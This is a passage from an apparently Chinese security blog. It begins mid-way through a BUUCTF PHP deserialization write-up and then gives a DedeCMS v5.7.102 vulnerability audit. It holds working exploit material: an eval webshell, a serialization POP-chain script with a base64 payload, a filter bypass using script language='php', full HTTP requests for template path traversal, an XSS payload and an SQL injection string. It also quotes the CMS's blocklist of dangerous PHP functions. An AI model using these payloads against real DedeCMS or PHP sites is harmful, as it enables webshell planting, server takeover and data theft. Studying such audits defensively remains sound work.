方法中，只需要将$this-&gt;{$this-&gt;{$name}}的中的$this-&gt;{$name}值为upload_img，就能够调用upload_img方法。那要怎么才能触发__call，并且让$this-&gt;{$name}值为upload_img呢？\n在REgister.php文件中。\nclass Register extends Controller&#123;    public $checker;    public $registed;    public function __construct()    &#123;        $this-&gt;checker=new Index();    &#125;    public function __destruct()    &#123;        if(!$this-&gt;registed)&#123;            $this-&gt;checker-&gt;index();        &#125;    &#125;&#125;\n\nRegister中的__destruct方法调用了$this-&gt;checker-&gt;index();假设，我们把$this-&gt;checker改成Profile类，那这里的语句就能够触发Profile::__call方法。这样一条链条就形成了。\nRegister::__construct()-&gt;Register::__destruct()-&gt;Profile::__call()-&gt;Profile::__get()-&gt;Profile::__call()-&gt;Profile::upload_img()-&gt;copy()\n\nRegister::__construct()中将$this-&gt;checker指定为new Profile(),\n Register::__destruct() 会调用Profile类中的index方法，发现找不到，会触发Profile::__call。\npublic function __get($name)    &#123;        echo $name;        return $this-&gt;except[$name];    &#125;public function __call($name, $arguments)    &#123;        if ($this-&gt;&#123;$name&#125;) &#123;            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);        &#125;    &#125;\n\n触发Profile::__call,$name的值则为index,当执行到$this-&gt;{$name}发现找不到index这个属性，又会触发__get，__get则会从$this-&gt;except数组中取键名为index的值返回。当我们把$this-&gt;except属性值设置为[&quot;index&quot;=&gt;&quot;upload_img&quot;]，这样在执行$this-&gt;{$this-&gt;{$name}}($arguments);一句时，$this-&gt;{$name}不就是upload_img了吗。然后就会进入到upload_img方法中，接下来只需要修改一些属性值，就能执行到copy($this-&gt;filename_tmp,$this-&gt;filename);。这里怎么利用刚刚已经说过了。\n先注册一个账号，上传一个图片格式后缀的一句话木马(加GIF89a),拿到上传路径。\nshell.png\nGIF89a&lt;?php eval($_POST[&apos;shell&apos;]);?&gt;\n\n\n\n序列化上脚本。\n&lt;?php namespace app\\web\\controller;class Register&#123;    public $checker;    public $registed;    public function __construct()    &#123;        $this-&gt;checker;    &#125;    public function __destruct()    &#123;        if(!$this-&gt;registed)&#123;            $this-&gt;checker-&gt;index();        &#125;    &#125;&#125;class Profile&#123;    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except;    public function __construct()    &#123;        $this-&gt;except = [\"index\"=&gt;\"upload_img\"];        $this-&gt;ext = 1;        $this-&gt;filename_tmp = \"../public/upload/bbf397d7fe0caf2a2b01f9997ceca10b/fb5c81ed3a220004b71069645f112867.png\";        $this-&gt;filename = \"../public/upload/bbf397d7fe0caf2a2b01f9997ceca10b/shell.php\";        $this-&gt;checker = 0;        $this-&gt;upload_menu = md5($_SERVER['REMOTE_ADDR']);        @chdir(\"../public/upload\");        if (!is_dir($this-&gt;upload_menu)) &#123;            @mkdir($this-&gt;upload_menu);        &#125;        @chdir($this-&gt;upload_menu);    &#125;    public function upload_img()    &#123;        echo \"upload_img\";    if($this-&gt;checker)&#123;        if(!$this-&gt;checker-&gt;login_check())&#123;            $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\";            $this-&gt;redirect($curr_url,302);            exit();        &#125;    &#125;        if (!empty($_FILES)) &#123;            $this-&gt;filename_tmp = $_FILES['upload_file']['tmp_name'];            $this-&gt;filename = md5($_FILES['upload_file']['name']) . \".png\";            $this-&gt;ext_check();        &#125;        if ($this-&gt;ext) &#123;            if (getimagesize($this-&gt;filename_tmp)) &#123;\t\t\t\t# 利用点                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img = \"../upload/$this-&gt;upload_menu/$this-&gt;filename\";                $this-&gt;update_img();            &#125; else &#123;                $this-&gt;error('Forbidden type!', url('../index'));            &#125;        &#125; else &#123;            $this-&gt;error('Unknow file type!', url('../index'));        &#125;    &#125;    public function __get($name)    &#123;        echo \"__get\";        echo $name;        return $this-&gt;except[$name];    &#125;    public function __call($name, $arguments)    &#123;        echo \"__call\";        if ($this-&gt;&#123;$name&#125;) &#123;            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);        &#125;    &#125;&#125;$r1 = new Register();$p1 = new Profile();$r1-&gt;checker = $p1;echo base64_encode(serialize($r1));\n\nTzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6ODY6Ii4uL3B1YmxpYy91cGxvYWQvYmJmMzk3ZDdmZTBjYWYyYTJiMDFmOTk5N2NlY2ExMGIvZmI1YzgxZWQzYTIyMDAwNGI3MTA2OTY0NWYxMTI4NjcucG5nIjtzOjg6ImZpbGVuYW1lIjtzOjU5OiIuLi9wdWJsaWMvdXBsb2FkL2JiZjM5N2Q3ZmUwY2FmMmEyYjAxZjk5OTdjZWNhMTBiL3NoZWxsLnBocCI7czoxMToidXBsb2FkX21lbnUiO3M6MzI6ImY1Mjg3NjRkNjI0ZGIxMjliMzJjMjFmYmNhMGNiOGQ2IjtzOjM6ImV4dCI7aToxO3M6MzoiaW1nIjtOO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7Tjt9\n\nlogin_check函数中为反序列化的触发点。\n\n这里的index、home路由都会调用login_check。\n提交\n\n\n\n总结有意思，有意思，先自己做，做不起悄悄搂一眼大佬博客，在继续做，学到很多。\n","categories":["CTF","BUUCTF"],"tags":["反序列化","CTF","备份文件泄露"]},{"title":"【php代码审计】记一次DedeCMSv5.7.102 0day挖掘","url":"/2022/11/20/%5Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5DDedeCMS/","content":"DedeCMS任意文件包含漏洞漏洞环境DedeCMS v5.7 SP2\n\n\n\n\n\n\n\nDedeCMS v5.7 SP2下漏洞复现首先进入DedeCMS后台\n\n\n\n\n\n\n\n添加一个广告，并保存\n&lt;?php system(whoami);?&gt;\n\n\n\n\n\n\n\n\n执行\n\n\n\n\n\n\n\n这里编号是3 \n然后访问\nview-source:http://127.0.0.1:803/plus/ad_js.php?aid=3\n\n\n\n\n\n\n\n\n执行成功\n漏洞分析在 ad_js.php下\n\n\n\n\n\n\n\n这里首先会判断 网站根目录下 的 data/cache/myad-xx.htm 是否存在，如果不存在，直接去去数据库中查询，该广告的内容,并写入到该文件中，这里的aid，就是广告的id。如果存在，则直接包含。即便是htm文件，里面存在php代码也会当作php代码执行。\n接下来，看看那个地方在表#@__myad中插入字段 normbody，只要这个字段可控，意味着就能写入php代码，然后包含出来执行。\n\n\n\n\n\n\n\n在 ad_add.php 文件中\n\n\n\n\n\n\n\n当我们添加一个广告的时候\n\n\n\n\n\n\n\n抓包\n\n\n\n\n\n\n\n可以控制 normbody[link] $normbody[&#39;size&#39;] 等这些参数，所以我们直接写入我们要执行的php代码。然后得到一个广告id。\n然后去访问，第一次会先将从数据库中查询出来的数据写入文件，这里面的数据也包含php代码，第二访问，就会去包含这个文件，然后也就执行了php代码。\nDedeCMS V5.7.102下漏洞复现在之前分析那个版本中，我们在dede/ad_add.php通过控制 insert into语句在数据库 dede_myad的normbody字段中插入了我们的php恶意代码,然后再通过plus/ad_js.php中的查询语句通过aid也就是广告的编号，去查询dede_myad字段normbody的内容，并写入到DEDEDATA.&#39;/cache/myad-&#39;.$aid.&#39;.htm&#39; 文件中，$aid，也就是广告的编号。如果该文件已经存在，那么就会直接包含这个文件的内容，第二次访问也就会执行到php代码。\n 但是如果我们在v5.7.102这个版本再次通过这种方式去进行利用会发生什么？\n\n\n\n\n\n\n\n\n\n\n直接将我们的恶意代码拦截中断脚本运行了，我们看一看他的过滤规则。\nglobal $cfg_disable_funs;   $cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';   $cfg_disable_funs = $cfg_disable_funs.',[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert';   foreach (explode(\",\", $cfg_disable_funs) as $value) &#123;       $value = str_replace(\" \", \"\", $value);       if(!empty($value) &amp;&amp; preg_match(\"#[^a-z]+['\\\"]*&#123;$value&#125;['\\\"]*[\\s]*[([]#i\", \" &#123;$adbody&#125;\") == TRUE) &#123;           $adbody = dede_htmlspecialchars($adbody);           die(\"DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$adbody&#125;&lt;/pre&gt;\");       &#125;       if(!empty($value) &amp;&amp; preg_match(\"#&lt;\\?(php|=)#i\", \" &#123;$adbody&#125;\") == TRUE) &#123;           $adbody = dede_htmlspecialchars($adbody);           die(\"DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$adbody&#125;&lt;/pre&gt;\");       &#125;   &#125;   $adbody = str_replace('\"', '\\\"',$adbody);   $adbody = str_replace(\"\\r\", \"\\\\r\",$adbody);   $adbody = str_replace(\"\\n\", \"\\\\n\",$adbody);   $adbody = \"&lt;!--\\r\\ndocument.write(\\\"&#123;$adbody&#125;\\\");\\r\\n--&gt;\\r\\n\";   $fp = fopen($cacheFile, 'w');   fwrite($fp, $adbody);   fclose($fp);\n\n这里的第一个正则，过滤了很多危险函数，但是还远远不够。比如过滤了include，却没过滤require，过滤了需要执行命令的函数，却没过滤`命令` 的方式来执行命令。 \n第二个正则则是匹配php常用的php代码开头标签，常用的有\n&lt;?php....?&gt;&lt;?=....?&gt; // 相当于&lt;?php echo xxx?&gt;&lt;? ...  // 条件 需要在php.ini文件开启短风格，short_open_tag=On?&gt;&lt;%.... // 在php.ini打开搜索asp_tags (On, Off)，选择On开始asp风格%&gt;\n\n上面的正则 只过滤了两种，开启段标签需要特定条件，重新找到一种新的方式来绕过正则执行php代码。\n&lt;script language=&quot;php&quot;&gt;......&lt;/script&gt;\n\n这里我们组合成一个真正可用的payload\n&lt;script language=&apos;php&apos;&gt;`calc.exe`&lt;/script&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n可以看到 一下子弹出来三个计算器。因为在多个字段中插入了我们的恶意代码，有三个字段写入到DEDEDATA.&#39;/cache/myad-15.htm&#39;文件中，执行了三次，所以也就弹出来三个。\nDedeCMS任意文件包含漏洞2漏洞环境DedeCMS v5.7 SP2 (DedeCMS V5.7.102也有)\nDedeCMS v5.7 SP2下漏洞复现首先 准备一个文本 \n1.txt\n&lt;?php eval(phpinfo());?&gt;\n\n然后再后台上传这个文本文件\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n接下来，添加一个自定义表单\n\n\n\n\n\n\n\n确定\n\n\n\n\n\n\n\n然后抓包\n\n\n\n\n\n\n\ndiyid=2&amp;name=%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%9512&amp;table=dede_co_onepage&amp;listtemplate=list_diyform1.htm&amp;viewtemplate=../1.txt&amp;posttemplate=post_diyform1.htm&amp;public=2&amp;button=%E7%A1%AE%E5%AE%9A\n\n然后访问\n\n\n\n\n\n\n\nhttp://127.0.0.1:803/plus/diy.php?action=view&amp;diyid=2&amp;id=5\n\n\n\n\n\n\n\n\n成功执行了，刚刚写入文本里面的php代码。\nDedeCMS V5.7.102下漏洞复现如果按照上一个版本的方式进行复现，会怎么样？\n准备一个webshell\n&lt;?php phpinfo();？&gt;\n\n上传\n\n\n\n\n\n\n\n这里直接拦截了，而我们的目的也很简单，只需要将我们的webshell代码嵌入到任意文件中，通过文件包含就能执行。\n那么在那里能嵌入这个webshell呢？试了几个地方的上传，都会对php危险函数进行过滤。\n$cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';$cfg_disable_funs = $cfg_disable_funs.',[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert';foreach (explode(\",\", $cfg_disable_funs) as $value) &#123; $value = str_replace(\" \", \"\", $value);if(!empty($value) &amp;&amp; preg_match(\"#[^a-z]+['\\\"]*&#123;$value&#125;['\\\"]*[\\s]*[([]#i\", \" &#123;$content&#125;\") == TRUE) &#123;                $content = dede_htmlspecialchars($content);                die(\"DedeCMS提示：当前上传的文件中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;\");&#125;\n\n感觉什么都过滤完了，(、[都过滤了，感觉绕过有点困难。\n换了一条路，在模板管理这个地方。\n\n\n\n\n\n\n\n\n\n\n嵌入我们执行的php代码，这个文件的路径在templets/default/advancedsearch.htm下，而包含的路径是在templets/plus下，所以只需要../default/advancedsearch.htm 回退一个就能包含到这个模板文件。\n接下来 构造请求\n\n\n\n\n\n\n\nPOST /dede/diy_add.php?action=add HTTP/1.1Host: 127.0.0.1:804User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 224Origin: http://127.0.0.1:804Connection: closeReferer: http://127.0.0.1:804/dede/diy_add.phpCookie: menuitems=1_1%2C2_1%2C3_1%2C6_1%2C4_1%2C5_1; Hm_lvt_1040d081eea13b44d84a4af639640d51=1667789016; session_user=&quot;wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=&quot;; __bid_n=1844ff8cc203f37ffd4207; FPTOKEN=30$pnERmduVdgQ/ieHEmThRjAWAXBgYCPbG/FVVDbGVj8Qd0HBJJbuCruIZw32soP9/7B63RhbgLO250ygqxD7qkeDbRKtTUzNMuLodB0ZsJfR8SxhdllEjnjrFPVEoQpaQELwja4iz4l3feby5q4eMQWBYDp4bNIB2Q8MjE2umaElu6Sav5jVRFjbLtDojj5spFgS8jRYIVMstiawSmfkSlw4DA17UlHZo+lQ0Qb+NFehYM/Bfc96vX34Op6XYtWXHmEpxncfPOT5CLPeTX5Vij3D279mUc9ODr2DbBs2fCPzr85vPH2VXCeecHXxZHw1Co2+SHYuFP7wgWRXZp0sCv8T+LJ3rVLMlTZWI1qSFKe9ULTNEabZfIBwZ4xdlz3AOeI0kpLaKdQ2Q1wLv4g9RFgINYT8yq+kC32TIdqY6vYg=|aVBUo0kZ+SnBTYg6njVdG2ozq8EJcqU25JprY2S8nbQ=|10|ea81e3c8438111be80127d8508966e31; DedeUserID=1; DedeUserID__ckMd5=745c389b77f7c415; DedeLoginTime=1668305969; DedeLoginTime__ckMd5=a338026a5d13eaa2; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=2d45d6e33c97510f; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=1a4a5686a1d0663c; PHPSESSID=murkdk5juqrvq6fhaosjhupedi; security=impossible; _csrf_name_e542ade1=ee2724a98a4b5bae60a93c6bbad7cba1; _csrf_name_e542ade11BH21ANI1AGD297L1FF21LN02BGE1DNG=0523c8c7727b9b70; ENV_GOBACK_URL=%2Fdede%2Fdiy_main.phpUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: iframeSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 192.168.0.1diyid=20&amp;name=%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%9520&amp;table=dede_channeltype&amp;listtemplate=list_diyform3.htm&amp;viewtemplate=../default/advancedsearch.htm&amp;posttemplate=view_diyform3.htm&amp;public=2&amp;button=%E7%A1%AE%E5%AE%9A\n\n然后回到自定义表单\n\n\n\n\n\n\n\n\n\n\n漏洞分析两个版本的触发原理都是一致，只是包含的文件不一样。\n触发文件包含的点在在 plus/diy.php  164行\n\n\n\n\n\n\n\n这里文件包含的文件路径中拼接了一个变量，$div-&gt;viewTemplate 为div对象中的一个属性。\n在 25行\n\n\n\n\n\n\n\n跟进diyform类,看看是怎么为$div-&gt;viewTemplate赋值的。\n\n\n\n\n\n\n\n在构造函数中\nfunction __construct($diyid)&#123;        $this-&gt;diyid = $diyid;        $this-&gt;db = $GLOBALS['dsql'];        $query = \"SELECT * FROM #@__diyforms WHERE diyid='&#123;$diyid&#125;'\";        $diyinfo = $this-&gt;db-&gt;GetOne($query);        if(!is_array($diyinfo))        &#123;            showMsg('参数不正确，该自定义表单不存在','javascript:;');            exit();        &#125;        $this-&gt;info = $diyinfo['info'];        $this-&gt;name = $diyinfo['name'];        $this-&gt;table = $diyinfo['table'];        $this-&gt;public = $diyinfo['public'];        $this-&gt;listTemplate = $diyinfo['listtemplate'] != '' &amp;&amp; file_exists(DEDETEMPLATE.'/plus/'.$diyinfo['listtemplate']) ? $diyinfo['listtemplate'] : 'list_diyform.htm';        $this-&gt;viewTemplate = $diyinfo['viewtemplate'] != '' &amp;&amp; file_exists(DEDETEMPLATE.'/plus/'.$diyinfo['viewtemplate']) ? $diyinfo['viewtemplate'] : 'view_diyform.htm';;        $this-&gt;postTemplate = $diyinfo['posttemplate'] != '' &amp;&amp; file_exists(DEDETEMPLATE.'/plus/'.$diyinfo['posttemplate']) ? $diyinfo['posttemplate'] : 'post_diyform.htm';;    &#125;\n\n从上面的代码中，可以知道，通过$diyid 在 #@__diyforms表中查的数据赋值给了$this-&gt;listTemplate、$this-&gt;viewTemplate、$this-&gt;postTemplate等变量。\n假设，我们能控制#@__diyforms表中的viewtemplate字段，那么不就可以通过目录穿越的方式去包含任意文件了。\n接下来，看看有没有那个文件中给#@__diyforms的viewtemplate插入值。\n全局搜索表名#@_diyforms,在 div_add.php 中\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n65行\n$query = &quot;INSERT INTO #@__diyforms (`diyid`, `name`, `table`, `info`, `listtemplate`, `viewtemplate`, `posttemplate`, `public` ) VALUES (&apos;$diyid&apos;, &apos;$name&apos;, &apos;$table&apos;, &apos;&apos;, &apos;$listtemplate&apos;, &apos;$viewtemplate&apos;, &apos;$posttemplate&apos;, &apos;$public&apos;)&quot;;$dsql-&gt;ExecuteNoneQuery($query);\n\n通过这里的sql，我们就能给表 #@__diyforms 中的 viewtemplate插入我们想传入的数据。\ndiy_add.php\nrequire_once(dirname(__FILE__).\"/config.php\");CheckPurview('c_New');$mysql_version = $dsql-&gt;GetVersion();$mysql_versions = explode(\".\",trim($mysql_version));$mysql_version = $mysql_versions[0].\".\".$mysql_versions[1];if(empty($action))&#123;    $row = $dsql-&gt;GetOne(\"SELECT diyid FROM #@__diyforms ORDER BY diyid DESC LIMIT 0,1 \");    if(is_array($row)) $newdiyid = $row['diyid']+1;    else $newdiyid = 1;    include(DEDEADMIN.\"/templets/diy_add.htm\");&#125;else&#123;    if(preg_match(\"#[^0-9-]#\", $diyid) || empty($diyid))    &#123;        ShowMsg(\"&lt;font color=red&gt;'自定义表单diyid'&lt;/font&gt;必须为数字！\",\"-1\");        exit();    &#125;    if($table==\"\")    &#123;        ShowMsg(\"表名不能为空！\", \"-1\");        exit();    &#125;    $public = isset($public) &amp;&amp; is_numeric($public) ? $public : 0;    $name = dede_htmlspecialchars($name);    $row = $dsql-&gt;GetOne(\"SELECT * FROM #@__diyforms WHERE diyid='$diyid' OR `table` LIKE '$table' OR name LIKE '$name' \");    if(is_array($row))    &#123;        ShowMsg(\"可能自定义表单的‘diyid’、‘名称’在数据库中已存在，不能重复使用！\",\"-1\");        exit();    &#125;    $query = \"SHOW TABLES FROM &#123;$dsql-&gt;dbName&#125; \";    $dsql-&gt;SetQuery($query);    $dsql-&gt;Execute();    while($row = $dsql-&gt;getarray())    &#123;        if(empty($row[0])) $row[0] = '';        if($table == $row[0])        &#123;            showmsg('指定的表在数据库中重复', '-1');            exit();        &#125;    &#125;    $sql = \"CREATE TABLE IF NOT EXISTS  `$table`(    `id` int(10) unsigned NOT NULL auto_increment,    `ifcheck` tinyint(1) NOT NULL default '0',    \";    if($mysql_version &lt; 4.1)    &#123;        $sql .= \" PRIMARY KEY  (`id`)\\r\\n) TYPE=MyISAM; \";    &#125;    else    &#123;        $sql .= \" PRIMARY KEY  (`id`)\\r\\n) ENGINE=MyISAM DEFAULT CHARSET=\".$cfg_db_language.\"; \";    &#125;    if($dsql-&gt;ExecuteNoneQuery($sql))    &#123;        $query = \"INSERT INTO #@__diyforms (`diyid`, `name`, `table`, `info`, `listtemplate`, `viewtemplate`, `posttemplate`, `public` ) VALUES ('$diyid', '$name', '$table', '', '$listtemplate', '$viewtemplate', '$posttemplate', '$public')\";        $dsql-&gt;ExecuteNoneQuery($query);        showmsg('自定义表单创建成功，请自行添加字段', 'diy_main.php');    &#125;    else    &#123;        showmsg('自定义表单创建失败', '-1');    &#125;&#125;\n\n因为是使用全局变量注册的方式，$viewtemplate可以直接从GET/POST中接收到，但是执行到插入表 #@__diyforms的sql，还需要满足几个条件，第一个传入的diyid不能重复，第二个是 指定的table数据表名，不能跟之前插入的重复，也就是这个指定table的值要唯一。\n满足如上两个条件，就能可以控制 插入的$viewtemplate变量，通过之前的分析，这个变量控制了 include 包含的文件名。\n那是不是我们此时，将php代码嵌入到图片或者文本中，找一个可以上传文本或者图片的地方，上传然后目录穿越包含到这个文件，就可以getshell了呢。\n答案是，还不行。\n在 diy.php 文件中\nif(empty($diyid))&#123;    showMsg('非法操作!', 'javascript:;');    exit();&#125;require_once DEDEINC.'/diyform.cls.php';$diy = new diyform($diyid);# 省略了无关紧要的代码else if($action == 'view')&#123;    if(empty($diy-&gt;public))    &#123;        showMsg('后台关闭前台浏览' , 'javascript:;');        exit();    &#125;    if(empty($id))    &#123;        showMsg('非法操作！未指定id', 'javascript:;');        exit();    &#125;    if($diy-&gt;public == 2)    &#123;        $query = \"SELECT * FROM &#123;$diy-&gt;table&#125; WHERE id='$id' \";    &#125;    else    &#123;        $query = \"SELECT * FROM &#123;$diy-&gt;table&#125; WHERE id='$id' AND ifcheck=1\";    &#125;    $row = $dsql-&gt;GetOne($query);    if(!is_array($row))    &#123;        showmsg('你访问的记录不存在或未经审核', '-1');        exit();    &#125;    $fieldlist = $diy-&gt;getFieldList();    echo \"viewTemplate=\".$diy-&gt;viewTemplate;    include DEDEROOT.\"/templets/plus/&#123;$diy-&gt;viewTemplate&#125;\";&#125;\n\n这里也有一个条件需要满足 if(!is_array($row))，判断$row是否为数组，如果要让 $row为数组，那么$query的sql语句就需要查出来值，这里的表名是需要指定的， 并且还要求这个表里存在id和ifcheck=1这个字段。所以得到一个结论，表名可以控制，并且这个表中存在id和ifcheck两个字段，或者$diy-&gt;public==2 ，$diy-&gt;table表里存在id字段，并且有值。\n找了半天也没发现那张表存在 ifcheck这个字段，那就只有让$diy-&gt;public==2 ，$diy-&gt;table存在id字段。\n在dede_co_onepage表中\n\n\n\n\n\n\n\n在 diy_add.php 中 \n$query = &quot;INSERT INTO #@__diyforms (`diyid`, `name`, `table`, `info`, `listtemplate`, `viewtemplate`, `posttemplate`, `public` ) VALUES (&apos;$diyid&apos;, &apos;$name&apos;, &apos;$table&apos;, &apos;&apos;, &apos;$listtemplate&apos;, &apos;$viewtemplate&apos;, &apos;$posttemplate&apos;, &apos;$public&apos;)&quot;;$dsql-&gt;ExecuteNoneQuery($query);\n\n这两个变量都是可控的，所以我们只需要让$table 指定为 dede_co_onepage，$public 为 2， $viewtemplate 为带有webshell的文本或者图片的相对路径，就能getshell了。\n\n\n\n\n\n\n\n最后给出payload\ndiyid=2&amp;name=%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%9512&amp;table=dede_co_onepage&amp;listtemplate=list_diyform1.htm&amp;viewtemplate=../1.txt&amp;posttemplate=post_diyform1.htm&amp;public=2&amp;button=%E7%A1%AE%E5%AE%9A\n\n不管在哪儿上传都可以，但是构造相对路径的时候要改变。  这里是上传在网站根目录templets下，默认包含的路径是在templets/plus下，所以只需要 ../回退一个目录就可以包含到了。\nDedeCMS任意包含漏洞3这个漏洞利用流程跟上一个漏洞相似，只是文件包含触发的点不同。\n\n漏洞环境DedeCMS V5.7.102\n漏洞复现\n\n\n\n\n\n\n\n\n\n保存，然后点进自定义表单管理\n\n\n\n\n\n\n\n\n\n\n然后抓包，修改参数并提交，这里利用的是posttemplate这个参数\n\n\n\n\n\n\n\nPOST /dede/diy_add.php?action=add HTTP/1.1Host: 127.0.0.1:804User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 229Origin: http://127.0.0.1:804Connection: closeReferer: http://127.0.0.1:804/dede/diy_add.phpCookie: menuitems=1_1%2C2_1%2C3_1%2C6_1%2C4_1%2C5_1; Hm_lvt_1040d081eea13b44d84a4af639640d51=1667789016; session_user=&quot;wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=&quot;; __bid_n=1844ff8cc203f37ffd4207; FPTOKEN=30$pnERmduVdgQ/ieHEmThRjAWAXBgYCPbG/FVVDbGVj8Qd0HBJJbuCruIZw32soP9/7B63RhbgLO250ygqxD7qkeDbRKtTUzNMuLodB0ZsJfR8SxhdllEjnjrFPVEoQpaQELwja4iz4l3feby5q4eMQWBYDp4bNIB2Q8MjE2umaElu6Sav5jVRFjbLtDojj5spFgS8jRYIVMstiawSmfkSlw4DA17UlHZo+lQ0Qb+NFehYM/Bfc96vX34Op6XYtWXHmEpxncfPOT5CLPeTX5Vij3D279mUc9ODr2DbBs2fCPzr85vPH2VXCeecHXxZHw1Co2+SHYuFP7wgWRXZp0sCv8T+LJ3rVLMlTZWI1qSFKe9ULTNEabZfIBwZ4xdlz3AOeI0kpLaKdQ2Q1wLv4g9RFgINYT8yq+kC32TIdqY6vYg=|aVBUo0kZ+SnBTYg6njVdG2ozq8EJcqU25JprY2S8nbQ=|10|ea81e3c8438111be80127d8508966e31; DedeUserID__ckMd5=745c389b77f7c415; DedeLoginTime__ckMd5=a338026a5d13eaa2; PHPSESSID=murkdk5juqrvq6fhaosjhupedi; security=impossible; OrdersId=766dA1IFUQBVVQYGBAJaDwAFWwIGVlBUBFYCVl9lTGdXAVALUQRYCFNdZHgCWQw; lastCid=2; lastCid1BH21ANI1AGD297L1FF21LN02BGE1DNG=e18f3e7ad95cdb34; lastCidMenu=1; lastCidMenu1BH21ANI1AGD297L1FF21LN02BGE1DNG=1a637cf57856966e; _csrf_name_e542ade1=e9e17bc97df8185bece1aacc157008e1; _csrf_name_e542ade11BH21ANI1AGD297L1FF21LN02BGE1DNG=f8a882f4ac19c727; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=2d45d6e33c97510f; DedeLoginTime=1668340941; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=fb545e93e79c348e; ENV_GOBACK_URL=%2Fdede%2Fdiy_main.phpUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: iframeSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 192.168.0.1diyid=22&amp;name=%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%9522&amp;table=dede_admin&amp;listtemplate=list_diyform21.htm&amp;viewtemplate=view_diyform21.htm&amp;posttemplate=../default/advancedsearch.htm&amp;public=1&amp;button=%E7%A1%AE%E5%AE%9A\n\n然后访问 \n\n\n\n\n\n\n\n\n\n\n\n\n\n漏洞分析\n\n\n\n\n\n\n这个文件包含的点没有那么多限制，只需要控制路由action==post 和 $diy-&gt;postTempate即可，至于怎么控制$diy-&gt;postTempate，跟DedeCMS任意文件包含漏洞2漏洞分析中一致。\nDedeCMS 存储型xss漏洞漏洞环境DedeCMS V5.7.102\n漏洞复现\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;/div&gt;&lt;script&gt;alert(document.cookit);&lt;/script&gt;\n\n\n\n\n\n\n\n\n漏洞分析漏洞点存在  dede/article_add.php\n\n\n\n\n\n\n\nDedeCMS Sql报错注入漏洞漏洞环境DedeCMS V5.7.102\n漏洞复现\n\n\n\n\n\n\n\n\n\n提交，然后抓包\n在addtable参数替换掉\na` (`b` varchar(200) as (extractvalue(1,concat(0x7e,(database())))),#\n\n\n\n\n\n\n\n\n漏洞分析漏洞点在dede/mychannel_add.php\n\n\n\n\n\n\n\n这里的$trueTable2是在38行被赋值，也就是表名是可以被外部控制，并且用的`反引号闭合，所以直接传入一个反引号就可以闭合，利用的方式也很关键。\na` (`b` varchar(200) as (extractvalue(1,concat(0x7e,(database())))),#\n\n拼接进去最终执行的是\nCREATE TABLE `a` (`b` varchar(200) as (extractvalue(1,concat(0x7e,(database())))),#`(                      `aid` int(11) NOT NULL default '0',                    `typeid` int(11) NOT NULL default '0',                    `redirecturl` varchar(255) NOT NULL default '',                    `templet` varchar(30) NOT NULL default '',                    `userip` char(15) NOT NULL default '',                      